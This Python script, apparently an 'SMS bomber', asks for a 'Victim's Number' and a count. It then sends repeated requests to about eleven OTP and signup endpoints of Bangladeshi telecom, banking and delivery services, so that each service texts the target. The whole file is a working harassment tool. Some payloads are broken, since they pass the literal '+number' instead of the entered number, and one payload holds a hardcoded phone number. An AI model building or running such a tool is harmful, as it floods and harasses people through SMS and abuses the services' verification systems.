import requests

from requests.structures import CaseInsensitiveDict

import os

import sys

import time

os.system("clear")

red = "\033[0;31m"  # Red

yellow = "\033[0;33m"  # Yellow

green = "\033[0;32m"  # Green

color_off = "\033[0m"  # Text Reset

bblack = "\033[1;30m"  # Black

bred = "\033[1;31m"  # Red

ured = "\033[4;31m"  # Red

on_green = "\033[42m"  # Green

blue = "\033[0;34m"  # Blue

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan = "\033[96m"

end = '\033[0m'

purple = "\033[0;35m"

# GET

number=str(input("\f\n Enter Victim’s Number:"))

if number.isdigit() and len(number) == 11:
    print("\nThe Phone number Good")
else:
    print("The number does not have 11 digits.")


api1=("https://backoffice.ecourier.com.bd:443/api/web/individual-send-otp?mobile="+number)

#GET 

api2=("http://206.189.134.221:80/wordpress/wp-content/uploads/bmb/"+number)

#GET

api3=("http://apibeta.iqra-live.com:80/api/v1/sent-otp/"+number)

#GET Only Banglalink

api4=("https://web-api.banglalink.net:443/api/v1/user/number/validation/"+number)


#GET Method  End


#Post Method Start


#Post Only Greenphone

api5=("https://weblogin.grameenphone.com:443/backend/api/v1/otp")

headers5 = CaseInsensitiveDict()
headers5["Content-Type"] = "application/json"

data5 = """
{
 "msisdn":"01308853527"
}

"""

#Post 

api6=("https://api.redx.com.bd:443/v1/user/signup"+number)

data6 = """
{
 "name":"+number",
 "service":"redx",
 "phoneNumber":"+number"
}
"""

headers6= CaseInsensitiveDict()
headers6["Content-Type"] = "application/json"

#Post 

api7=("https://developer.quizgiri.xyz:443/api/v2.0/send-otp")

data7="""
{
 "phone":"+number",
 "country_code":"+880"
}
"""

headers7= CaseInsensitiveDict()
headers7["Content-Type"] = "application/json"

#Post

api8=("https://apix.rabbitholebd.com/appv2/login/requestOTP")

data8 = '{"mobile":"+88+number"}'

headers8= CaseInsensitiveDict()
headers8["Content-Type"] = "application/json"

#Post

api9=("http://27.131.15.19/lstyle/api/lsotprequest")

data9= """{
  \"shortcode\": \"2494905\",
  \"msisdn\": \"88"""+number+"""\"
}"""
headers9= CaseInsensitiveDict()
headers9["Content-Type"] = "application/json"

#Post Only Airtel

api10=("https://api.bd.airtel.com:443/v1/account/login/otp")

data10="""
{
 "phone_number":"+number+"
}"""

headers10= CaseInsensitiveDict()
headers10["Content-Type"] = "application/json"

api11 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"

headers11 = CaseInsensitiveDict()
headers11["Content-Type"] = "application/json"

data11 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'


amount=int(input("\f\nEnter Your Amount : "))

os.system(" clear")
print(f"\n\n\t   |     AMOUNT ({amount})   |\n")

for i in range (amount):

 requests.get(api1)
 
 requests.get(api2)

 requests.get(api3)

 requests.get(api4)

 requests.post(api5, headers=headers5, data=data5)

 requests.post(api6, headers=headers6, data=data6)
 
 requests.post(api7, headers=headers7, data=data7)

 requests.post(api8, headers=headers8, data=data8)

 requests.post(api9, headers=headers9, data=data9)

 requests.post(api10, headers=headers10, data=data10)
 
 requests.post(api11, headers=headers11,
 data=data11)
 print("\n\t"+str(i + 1) + green + '. ➙SMS Sent ♥️ D- Bomber √         ')
